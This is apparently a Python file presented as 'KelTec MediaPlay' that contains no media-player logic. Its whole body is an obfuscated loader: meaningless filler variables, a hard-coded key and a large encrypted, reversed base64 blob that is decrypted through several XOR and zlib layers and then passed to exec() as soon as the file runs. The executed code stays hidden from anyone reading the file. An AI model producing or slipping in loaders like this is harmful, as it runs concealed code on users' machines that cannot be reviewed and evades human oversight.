# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 565365 ^ 995956
_lx1_1 = len("a649ce")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-550446)
_lx3_3 = 396004 * 0
_lx4_4 = 457153 ^ 524462
_K = '048def759b27a120ca0870ca2b7ebdb4cca62375fa4889a320f0c4f00a0cb143'
_M = 'YgZ/afizNR6VfT+5+cawtynVQ+pm1jGHHFG4uPoLG6VmUygkou5tCZsqYb2vwLa4J99G6mHWN9UcXb668lZPo2kAfyqgv2pelnk2'
_D = '=IgrbUeOodaaAC5vt1WQmY6ckWvXOWdDL9pHLNOD25/c/EG2okgGazpPVviN2Y9FYm9TE0wfueQDrMo4Kaxsxw3WLmE7cyXRmkfaogv/Cksi2j4TKtPgZLxpT3mTbR1LfuEu14x38lWwlRLXRdefjrOHQNfKQ2TOVnu7eQ6bLzAsWJjcGL5fwoXrxzlBRnbfqgrFxw6YAD8NKVe+TuGoYRD5EMpwedhxIb1c7pi6uMwmUQLQ75jxWJy+X4+SRyKBDTGRQRBgEIYcST9eG4hNGa2zNAk83LXUZHiLOr8Y1/88QJysKy9IqER+9T5ErrOSU/D09QvzT/P5y52pugcbymFgRf2OUPzxbg95fVoOyzvs7/0vR7SAxT5FeVZI2i11ZJOKslFFqqpsvG6y/PpxGxMcWqson/PDYCXrG1xepAgiTZjpFbRlTdTc4nGEXFfKZf4eJafah43UiGCJxl75b0wJ2rN2kZ6TMVSNFh9OD8Ka5S04zUMM5sZ7R7RuJrbsrlUkRvnrsMnMiroQUTvY1YzbNj8icwYheWNhlOUITtGXvL9TF0FJ4dxrRo+bAqQkgvv1x6xik+xwcrWgP33SxUMHhQONIhEbr6m8Dmaxhm+4Uc3GRl3dpJZL/dRRmg2xy9gxcaXFq/jvziAnOtwmmrfNeJzSBp5R1wrkp5IWtC98fcUaoxtVDGIiv5vOfXB+5ISxunRd7lHHaWcGLugEuyOKJfylZrzHkvcPVDJtEY+K2Hki3Nc89dce30Hh0OTuosBbxI6jP+ctWexN+YWLpsJMPcNt/b/Og5KoFNZu0METpt8WmN7xynThfICHIRD63pNGAmBi0/3qQ1sdrZP1r08MO6UsPgCkbxHa7bZvbbDbTbw75B02XjvjaENRvzcWxbv4uNKwJ164xqAvA9q4e+g/Kom8HkFGMG711DxmqgPq5ifsl7Qx7KRjLg2Ic35A7hbuGcSNkD8tArido00fXFZahLiglfBRa1impqTrp3JXlb9oVP3HgPa7gwXYCzP7NZ4f9kBHzHhyKCOTnwDPs6ARy1pioY7iFWmhHDd+Smqvw6TNmxrok0Bty1w8RRU6sgLpf7Z4son8SrUvO41cKyK2hF9rWjcw9HgdY9dHMCdvIlvUQjRUaX+O90TBNxUa7z1kEw30XgvQKQ/RarhaXfCpY5SPCBq+XScD0EiFarDXUh+j03Hl733MZlZpG3YYsQmA8NAKUJAEuVrAb26MvrIV8h8itsfc/4/uJxtRmUphZOvnB5uiT4CZ08O6Mpq9Qcr8MKEgzDwpAPnVaDif+WGqZlI3HcLhJfvieYcuHoCaGqZ18NrdwVV2SiuixMkr6wjqUPE+Ha2BzAzCKHDlcc40Q4y/vQ1ZDSjOdybBCSdwMsHreeksrLqW4vkcvOioMcBZlccwPuc9Y6T5YzFMfNjvmlEHAzDHf5MM57aT1tzrvvPOy5uMoNgCrB1JwsDV7VAj5x8OgP+NPJ8HXoEvMhNttybFkNP/uAyYOjfWL9drPzly5KXZLxSNqdjEciyiitUmU/PcCwK+Lnp0AS5B3KFwzwQETPkbqSgYLmDh+PJlf5mfpV67'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    exec(compile(src,'<mediaplay>','exec'),{'__name__':'__main__','__file__':__file__})
_run()